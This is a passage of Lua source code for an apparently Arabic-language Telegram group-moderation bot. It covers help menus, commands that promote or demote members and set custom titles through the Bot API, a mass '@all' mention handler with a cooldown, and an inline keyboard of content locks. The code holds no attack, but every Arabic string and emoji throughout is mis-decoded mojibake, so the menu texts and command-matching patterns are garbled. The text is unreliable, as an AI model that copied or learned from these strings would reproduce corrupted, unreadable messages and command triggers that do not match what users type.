βοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ
βοΈβΏΨ±ΩΨΉ/ΩΨ΄Ω Ψ§ΩΩΩΩΨ―
βοΈβΏΨͺΩΨ²ΩΩ Ψ§ΩΩΩ
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΉΨ¨Ω/Ψ§ΩΨ§ΩΨΉΨ§Ψ¨
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΨ·Ψ±Ψ―
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄
π βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ²ΩΩ
β¨οΈβΏΨͺΨΉΩΩ/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω
πβΏΨ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ
πβΏΨ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ―
γ½οΈβΏΨ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ― ΩΨͺΨΉΨ―Ψ―
πβΏΨ§ΩΨ§Ψ―ΩΩΩΩ
πβΏΨ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±
πβΏΨͺΩΨΈΩΩ + ΨΉΨ―Ψ―
πβΏΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ
πβΏΩΨ³Ψ­ Ψ§ΩΩΩΨ―ΩΨ§
πβΏΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβΏΩΨͺΨΊΩΨ± Ψ±Ψ―ΩΨ― Ψ§ΩΨ§ΩΨ―Ω :- 
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ + Ψ§ΩΩΨ΅
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω' and Constructor(msg) then
Text = [[
πβΏΨ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ 
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦
βοΈβΏΨ§ΩΩΩΨ΄Ψ¦ΩΩ
πβΏΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ
πβΏΨ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ±
βοΈβΏΨ§ΩΩΨ―Ψ±Ψ§Ψ‘
πβΏΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
πβΏΨͺΨΉΩΩ/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω
π―βΏΨ§ΨΆΩ/Ψ­Ψ°Ω Ψ§ΩΨ±
π―βΏΨ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
π―βΏΨ­Ψ°Ω/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
π―βΏΨ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω + Ψ§ΩΨΉΨ―Ψ― Ψ¨Ψ§ΩΨ±Ψ―
π―βΏΨ§ΨΆΩ ΩΨ¬ΩΩΨ±Ψ§Ψͺ + Ψ§ΩΨΉΨ―Ψ― Ψ¨Ψ§ΩΨ±Ψ―
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± ' and DevBot(msg) then
Text = [[
πβπ¨βΏΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω  
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βοΈβΏΨ­ΨΈΨ± ΨΉΨ§Ω
βοΈβΏΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω
πβΏΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω
π§βΏΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ
π βΏΨ§ΨΆΩ /Ψ­Ψ°Ω ΩΨ·ΩΨ± 
πβπ¨βΏΨ§ΩΩΨ·ΩΨ±ΩΩ
πβΏΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ
πβΏΨ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ― ΨΉΨ§Ω 
πβΏΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±
πβΏΨ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ± 
πβΏΩΨΆΨΉ /Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ± 
βοΈβΏΨͺΨ­Ψ―ΩΨ«  + ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³ 
π βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ 
π βΏ ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ + Ψ§ΩΨΉΨ―Ψ―
π βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ψ©
π βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ 
πβΏΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± 
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβπ¨βΏΨͺΩΨΉΩΩ /ΨͺΨΉΨ·ΩΩ

βοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ§ΩΩ 
βοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω
βοΈβΏΨ±ΩΨΉ ΩΩΨ΄Ψ¦ 
πβΏΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ
πβΏΨ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ 
π―βΏΨΊΨ§Ψ―Ψ± 
π―βΏΨΊΨ§Ψ―Ψ± + Ψ§ΩΨ§ΩΨ―Ω
π―βΏΨ§Ψ°Ψ§ΨΉΩ 
π―βΏΨ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ
π―βΏΨ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ 
π―βΏΨ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ 
π―βΏΨ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ 
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end

if text and text:match("ΨΆΨΉ ΩΩΨ¨ (.*)") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
local namess = text:match("ΨΆΨΉ ΩΩΨ¨ (.*)")
function Function_Tshake(extra, result, success)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΨΉΨΉΩΩ ΩΩΨ¨")  
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_invite_users=True")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&custom_title="..namess)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^(ΨΆΨΉ ΩΩΨ¨) @(.*) (.*)$") and Constructor(msg) then
local username = {string.match(text, "^(ΨΆΨΉ ΩΩΨ¨) @(.*) (.*)$")}
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΨΉΩΩΩ ΩΩΨ¨")  
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_invite_users=True")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&custom_title="..username[3])
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username[2]}, Function_Tshake, nil)
return false
end

if text == ("ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
function Function_Tshake(extra, result, success)
local Text = "πβΏΨ§Ψ?ΨͺΨ± ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.sender_user_id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ @(.*)$") and Constructor(msg) then
local username = text:match("^ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end
local Text = "πβΏΨ§Ψ?ΨͺΨ± ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text == ("Ψ±ΩΨΉ ΩΨ΄Ψ±Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
function Function_Tshake(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_invite_users=True")
local Text = "πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ΄Ψ±Ω"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.sender_user_id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ΄Ψ±Ω @(.*)$") and Constructor(msg) then
local username = text:match("^Ψ±ΩΨΉ ΩΨ΄Ψ±Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_invite_users=True")
local Text = "πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ΄Ψ±Ω"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ―ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text == ("ΨͺΩΨ²ΩΩ ΩΨ΄Ψ±Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
function Function_Tshake(extra, result, success)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ΄Ψ±ΩΩΩ")  
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_manage_chat=false&can_manage_voice_chats=false&can_manage_voice_chats=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ΄Ψ±Ω @(.*)$") and Constructor(msg) then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ΄Ψ±Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ΄Ψ±ΩΩΩ")  
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_manage_chat=false&can_manage_voice_chats=false&can_manage_voice_chats=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ§Ω' and Constructor(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' β’ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ§Ω' and Constructor(msg) then  
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
database:set(bot_id..'Cick:all'..msg.chat_id_,true)  
Text = '\n β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± @all'
else
Text = '\n β’ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± @all'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == "@all" and Constructor(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."cccbcc:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"Ψ§ΩΨͺΨΈΨ± Ψ―ΩΩΩΩ ΩΩ ΩΨΆΩΩ")
end
database:setex(bot_id..'cccbcc:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,amir)
x = 0
tags = 0
local list = amir.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all"
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown")
end
end,nil)
end
end,nil)
end,nil)
end
end





if text == 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΩ' and Addictive(msg) then
local Texti = 'ΨͺΨ³ΨͺΨ·ΩΨΉ ΩΩΩ ΩΩΨͺΨ­ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockjoine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΆΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockjoine"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=msg.sender_user_id_.."/lockchat"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=msg.sender_user_id_.."/unlockchat"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=msg.sender_user_id_.."/lock_joine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=msg.sender_user_id_.."/unlock_joine"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockbots"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockbots"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=msg.sender_user_id_.."/locktags"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=msg.sender_user_id_.."/unlocktags"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=msg.sender_user_id_.."/lockedit"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=msg.sender_user_id_.."/unlockedit"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/locklink"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/unlocklink"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockusername"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockusername"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΨ§Ω', callback_data=msg.sender_user_id_.."/locktag"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω', callback_data=msg.sender_user_id_.."/unlocktag"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/locksticar"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlocksticar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=msg.sender_user_id_.."/lockgif"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=msg.sender_user_id_.."/unlockgif"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ', callback_data=msg.sender_user_id_.."/lockvideo"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ', callback_data=msg.sender_user_id_.."/unlockvideo"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨ±', callback_data=msg.sender_user_id_.."/lockphoto"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±', callback_data=msg.sender_user_id_.."/unlockphoto"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockvoise"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockvoise"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨͺ', callback_data=msg.sender_user_id_.."/lockaudo"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ', callback_data=msg.sender_user_id_.."/unlockaudo"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=msg.sender_user_id_.."/lockfwd"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=msg.sender_user_id_.."/unlockfwd"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockfile"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockfile"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockphone"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockphone"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=msg.sender_user_id_.."/lockposts"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=msg.sender_user_id_.."/unlockposts"},
},
{
